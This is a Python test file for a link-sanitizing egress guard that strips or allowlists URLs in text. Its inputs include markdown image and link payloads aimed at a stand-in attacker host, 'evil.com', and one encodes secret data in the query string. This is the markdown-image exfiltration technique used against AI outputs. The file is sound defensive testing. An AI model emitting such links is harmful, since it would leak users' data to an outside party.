"""Tests for EgressGuard (H6) — exfil-channel neutralization."""
from seatbelt.egress import LinkPolicyEgressGuard
from seatbelt.types import EgressConfig, EgressResult

guard = LinkPolicyEgressGuard()


def test_render_links_false_strips_all():
    text = "See ![x](http://evil.com/leak?data=secret) and [click](https://evil.com/x) also http://evil.com"
    res = guard.sanitize(text, EgressConfig(render_links=False))
    assert "http" not in res.sanitized_text
    assert "http://evil.com/leak?data=secret" in res.blocked
    assert "https://evil.com/x" in res.blocked
    assert "http://evil.com" in res.blocked
    assert "click" in res.sanitized_text  # link text preserved
    assert res.allowed is True


def test_render_links_true_allowlist():
    text = "Visit [brand](https://mybrand.com/page) or [evil](https://evil.com/steal)"
    cfg = EgressConfig(render_links=True, allow_domains=["mybrand.com"])
    res = guard.sanitize(text, cfg)
    assert "https://mybrand.com/page" in res.sanitized_text
    assert "https://evil.com/steal" not in res.sanitized_text
    assert "https://evil.com/steal" in res.blocked
    assert "brand" in res.sanitized_text
    assert res.allowed is True


def test_subdomain_allowed():
    text = "[help](https://help.mybrand.com/faq)"
    cfg = EgressConfig(render_links=True, allow_domains=["mybrand.com"])
    res = guard.sanitize(text, cfg)
    assert "https://help.mybrand.com/faq" in res.sanitized_text
    assert res.blocked == []
